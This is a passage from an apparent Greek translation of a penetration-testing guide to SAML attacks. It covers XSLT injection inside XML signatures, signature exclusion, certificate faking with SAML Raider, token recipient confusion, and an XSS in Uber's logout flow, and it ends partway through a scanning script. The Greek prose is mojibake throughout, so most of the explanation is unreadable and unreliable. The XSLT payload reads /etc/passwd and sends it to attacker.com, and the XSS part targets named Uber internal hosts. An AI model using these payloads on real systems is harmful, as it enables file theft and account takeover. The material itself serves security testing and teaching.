ÏŒÏ„Î¹ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ Î­Î³ÎºÏ…ÏÎ· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®. ÎœÎ¹Î± Î±Ï…Ï„Î¿-Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î· Î® Î¼Î· Î­Î³ÎºÏ…ÏÎ· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î® Î³Î¹Î± Î½Î± Ï€ÏÎ¿Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ.

Î•Î´Ï Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± **POC** Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î³Î¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÎ¯Î´Î¿Ï‚ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½, ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± hacktricks Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï„Î¿ POC Î±Ï€ÏŒ Î­Î½Î± SAML request Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ XSLT.

Î•Î»Î­Î³Î¾Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ Î¿Î¼Î¹Î»Î¯Î±: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

Î— **XML Signature Exclusion** Ï€Î±ÏÎ±Ï„Î·ÏÎµÎ¯ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Ï„Ï‰Î½ Ï…Î»Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ SAML ÏŒÏ„Î±Î½ Ï„Î¿ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Signature Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ½. Î•Î¬Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Î»ÎµÎ¯Ï€ÎµÎ¹, **Î· ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹**, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï€Î¿Ï… ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÏ€Î±Î»Î·Î¸ÎµÏÎ¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†Î®.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). Î Î±ÏÎµÎ¼Î²Î¬Î»ÎµÏ„Îµ Ï„Î·Î½ SAML Response ÎºÎ±Î¹ ÎºÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ `Remove Signatures`. ÎœÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ **ÏŒÎ»Î±** Ï„Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± Signature Î±Ï†Î±Î¹ÏÎ¿ÏÎ½Ï„Î±Î¹.

ÎœÎµ Ï„Î¹Ï‚ Ï…Ï€Î¿Î³ÏÎ±Ï†Î­Ï‚ Î±Ï†Î±Î¹ÏÎµÎ¼Î­Î½ÎµÏ‚, ÎµÏ€Î¹Ï„ÏÎ­ÏˆÏ„Îµ ÏƒÏ„Î¿ Î±Î¯Ï„Î·Î¼Î± Î½Î± Ï€ÏÎ¿Ï‡Ï‰ÏÎ®ÏƒÎµÎ¹ ÏƒÏ„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿. Î•Î¬Î½ Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ Î¥Ï€Î·ÏÎµÏƒÎ¯Î±

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Î¤Î¿ Certificate Faking ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î±Î½ Î­Î½Î±Ï‚ **Service Provider (SP) ÎµÏ€Î±Î»Î·Î¸ÎµÏÎµÎ¹ ÏƒÏ‰ÏƒÏ„Î¬ ÏŒÏ„Î¹ Î­Î½Î± SAML Message ÎµÎ¯Î½Î±Î¹ Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿** Î±Ï€ÏŒ Î­Î½Î±Î½ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿ Identity Provider (IdP). Î ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ \***self-signed certificate** Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î·Î½ SAML Response Î® Assertion, Ï€Î¿Ï… Î²Î¿Î·Î¸Î¬ ÏƒÏ„Î·Î½ Î±Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ ÎµÎ¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î·Ï‚ Î¼ÎµÏ„Î±Î¾Ï SP ÎºÎ±Î¹ IdP.

### How to Conduct Certificate Faking

Î¤Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î²Î®Î¼Î±Ï„Î± Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†Î¿Ï…Î½ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Burp [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e):

1. Î Î±ÏÎµÎ¼Î²Î¬Î»ÎµÏ„Îµ Ï„Î·Î½ SAML Response.
2. Î•Î¬Î½ Î· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± Ï…Ï€Î¿Î³ÏÎ±Ï†Î®, ÏƒÏ„ÎµÎ¯Î»Ï„Îµ Ï„Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ ÏƒÏ„Î¿ SAML Raider Certs Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ¿Ï…Î¼Ï€Î¯ `Send Certificate to SAML Raider Certs`.
3. Î£Ï„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± Certificates Ï„Î¿Ï… SAML Raider, ÎµÏ€Î¹Î»Î­Î¾Ï„Îµ Ï„Î¿ ÎµÎ¹ÏƒÎ±Î³ÏŒÎ¼ÎµÎ½Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ ÎºÎ±Î¹ ÎºÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ `Save and Self-Sign` Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± self-signed clone Ï„Î¿Ï… Î±ÏÏ‡Î¹ÎºÎ¿Ï Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÎ¿Ï.
4. Î•Ï€Î¹ÏƒÏ„ÏÎ­ÏˆÏ„Îµ ÏƒÏ„Î¿ Ï€Î±ÏÎµÎ¼Î²Î±Î»Î»ÏŒÎ¼ÎµÎ½Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ Proxy Ï„Î¿Ï… Burp. Î•Ï€Î¹Î»Î­Î¾Ï„Îµ Ï„Î¿ Î½Î­Î¿ self-signed Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ Î±Ï€ÏŒ Ï„Î¿ Î±Î½Î±Ï€Ï„Ï…ÏƒÏƒÏŒÎ¼ÎµÎ½Î¿ Î¼ÎµÎ½Î¿Ï XML Signature.
5. Î‘Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎµÏ‚ Ï…Ï€Î¿Î³ÏÎ±Ï†Î­Ï‚ Î¼Îµ Ï„Î¿ ÎºÎ¿Ï…Î¼Ï€Î¯ `Remove Signatures`.
6. Î¥Ï€Î¿Î³ÏÎ¬ÏˆÏ„Îµ Ï„Î¿ Î¼Î®Î½Ï…Î¼Î± Î® Ï„Î·Î½ Î´Î®Î»Ï‰ÏƒÎ· Î¼Îµ Ï„Î¿ Î½Î­Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ **`(Re-)Sign Message`** Î® **`(Re-)Sign Assertion`** ÎºÎ¿Ï…Î¼Ï€Î¯, ÏŒÏ€Ï‰Ï‚ Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹.
7. Î ÏÎ¿Ï‰Î¸Î®ÏƒÏ„Îµ Ï„Î¿ Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿ Î¼Î®Î½Ï…Î¼Î±. Î— ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î¿ SP Î±Ï€Î¿Î´Î­Ï‡ÎµÏ„Î±Î¹ Î¼Î·Î½ÏÎ¼Î±Ï„Î± Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î± Î±Ï€ÏŒ Ï„Î¿ self-signed Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ ÏƒÎ±Ï‚, Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„Î¿Î½Ï„Î±Ï‚ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ Ï„Ï‰Î½ SAML Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Î— Token Recipient Confusion ÎºÎ±Î¹ Î· Service Provider Target Confusion Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Î±Î½ Î¿ **Service Provider ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÎ¹ ÏƒÏ‰ÏƒÏ„Î¬ Ï„Î¿Î½ Ï€ÏÎ¿Î¿ÏÎ¹ÏƒÎ¼ÏŒ ÎµÎ½ÏŒÏ‚ response**. Î£Ï„Î·Î½ Î¿Ï…ÏƒÎ¯Î±, Î­Î½Î±Ï‚ Service Provider Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î¿ÏÏÎ¯Ï€Ï„ÎµÎ¹ Î¼Î¹Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎµÎ¬Î½ Ï€ÏÎ¿Î¿ÏÎ¹Î¶ÏŒÏ„Î±Î½ Î³Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ Ï€Î¬ÏÎ¿Ï‡Î¿. Î¤Î¿ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ ÎµÎ´Ï ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ **Recipient**, Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ **SubjectConfirmationData** Î¼Î¹Î±Ï‚ SAML Response. Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ Ï€Î¿Ï Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ„Î±Î»ÎµÎ¯ Î· Assertion. Î•Î¬Î½ Î¿ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒÏ‚ Ï€Î±ÏÎ±Î»Î®Ï€Ï„Î·Ï‚ Î´ÎµÎ½ Ï„Î±Î¹ÏÎ¹Î¬Î¶ÎµÎ¹ Î¼Îµ Ï„Î¿Î½ Ï€ÏÎ¿Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ Service Provider, Î· Assertion Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¸ÎµÏ‰ÏÎµÎ¯Ï„Î±Î¹ Î¬ÎºÏ…ÏÎ·.

#### **How It Works**

Î“Î¹Î± Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î¹ÎºÏ„Î® Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· Token Recipient Confusion (SAML-TRC), Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î»Î·ÏÎ¿ÏÎ½Ï„Î±Î¹ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÏÎ¿Ï‹Ï€Î¿Î¸Î­ÏƒÎµÎ¹Ï‚. Î ÏÏÏ„Î¿Î½, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Î­Î³ÎºÏ…ÏÎ¿Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ ÏƒÎµ Î­Î½Î±Î½ Service Provider (Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Î¿Ï‚ Ï‰Ï‚ SP-Legit). Î”ÎµÏÏ„ÎµÏÎ¿Î½, Î¿ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿Ï‚ Service Provider (SP-Target) Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î¿Î´Î­Ï‡ÎµÏ„Î±Î¹ tokens Î±Ï€ÏŒ Ï„Î¿Î½ Î¯Î´Î¹Î¿ Identity Provider Ï€Î¿Ï… ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„ÎµÎ¯ Ï„Î¿Î½ SP-Legit.

Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»Î® Ï…Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€ÏÎ¿Ï‹Ï€Î¿Î¸Î­ÏƒÎµÎ¹Ï‚. ÎœÎ¹Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ® ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Î¾ÎµÎºÎ¹Î½Î¬ Î¼Îµ Ï„Î¿Î½ SP-Legit Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Î¿Ï… Identity Provider. Î— SAML Response Î±Ï€ÏŒ Ï„Î¿Î½ Identity Provider Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ SP-Legit Ï€Î±ÏÎµÎ¼Î²Î¬Î»Î»ÎµÏ„Î±Î¹. Î‘Ï…Ï„Î® Î· Ï€Î±ÏÎµÎ¼Î²Î±Î»Î»ÏŒÎ¼ÎµÎ½Î· SAML Response, Ï€Î¿Ï… Ï€ÏÎ¿Î¿ÏÎ¹Î¶ÏŒÏ„Î±Î½ Î±ÏÏ‡Î¹ÎºÎ¬ Î³Î¹Î± Ï„Î¿Î½ SP-Legit, Î±Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÏ„Î±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÏƒÏ„Î¿Î½ SP-Target. Î— ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ Î¼ÎµÏ„ÏÎ¬Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ Î±Ï€Î¿Î´Î¿Ï‡Î® Ï„Î·Ï‚ Assertion Î±Ï€ÏŒ Ï„Î¿Î½ SP-Target, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï…Ï€ÏŒ Ï„Î¿ Î¯Î´Î¹Î¿ ÏŒÎ½Î¿Î¼Î± Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ Î³Î¹Î± Ï„Î¿Î½ SP-Legit.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î‘Ï€Î¿ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚

Î— Î±ÏÏ‡Î¹ÎºÎ® Î­ÏÎµÏ…Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏƒÏ„ÎµÎ¯ Î¼Î­ÏƒÏ‰ [Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÏƒÏ…Î½Î´Î­ÏƒÎ¼Î¿Ï…](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

ÎšÎ±Ï„Î¬ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï„Î·Ï‚ Î²Î¯Î±Î¹Î·Ï‚ Î±Î½Î±Î³ÎºÎ±ÏƒÏ„Î¹ÎºÎ®Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚, Î±Î½Î±ÎºÎ±Î»ÏÏ†Î¸Î·ÎºÎµ Î¼Î¹Î± ÏƒÎµÎ»Î¯Î´Î± Î±Ï€Î¿ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ ÏƒÏ„Î·:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
ÎšÎ±Ï„Î¬ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿, Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€ÏÎ¿Ï‚:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Î‘Ï…Ï„ÏŒ Î±Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎµ ÏŒÏ„Î¹ Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ `base` Î´Î­Ï‡ÎµÏ„Î±Î¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL. Î›Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ Ï…Ï€ÏŒÏˆÎ·, Ï€ÏÎ¿Î­ÎºÏ…ÏˆÎµ Î· Î¹Î´Î­Î± Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Î¼Îµ `javascript:alert(123);` ÏƒÎµ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î± Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· XSS (Cross-Site Scripting).

### ÎœÎ±Î¶Î¹ÎºÎ® Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

[Î‘Ï€ÏŒ Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ Î³Î¹Î± Î½Î± Î±Î½Î±Î»ÏÏƒÎµÎ¹ Ï…Ï€Î¿Ï„Î¿Î¼ÎµÎ¯Ï‚ Ï„Î¿Ï… `uberinternal.com` Î³Î¹Î± Ï„Î¿Î¼ÎµÎ¯Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î·Î½ Î¯Î´Î¹Î± Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½Î±Ï€Ï„ÏÏ‡Î¸Î·ÎºÎµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Î½Î± ÏƒÏ„Î¿Ï‡ÎµÏÏƒÎµÎ¹ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± `oidauth/prompt`. Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î´Î¿ÎºÎ¹Î¼Î¬Î¶ÎµÎ¹ Î³Î¹Î± XSS (Cross-Site Scripting) ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎºÎ±Î¹ ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Î±Î½ Î±Ï…Ï„Î¬ Î±Î½Î±ÎºÎ»ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î·Î½ Î­Î¾Î¿Î´Î¿. Î£Îµ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Î¿Ï… Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Î±Î½Î±ÎºÎ»Î¬Ï„Î±Î¹ Ï€ÏÎ¬Î³Î¼Î±Ï„Î¹, Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÏƒÎ·Î¼Î±Ï„Î¿Î´Î¿Ï„ÎµÎ¯ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Ï‰Ï‚ ÎµÏ…Î¬Î»Ï‰Ï„Î·.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
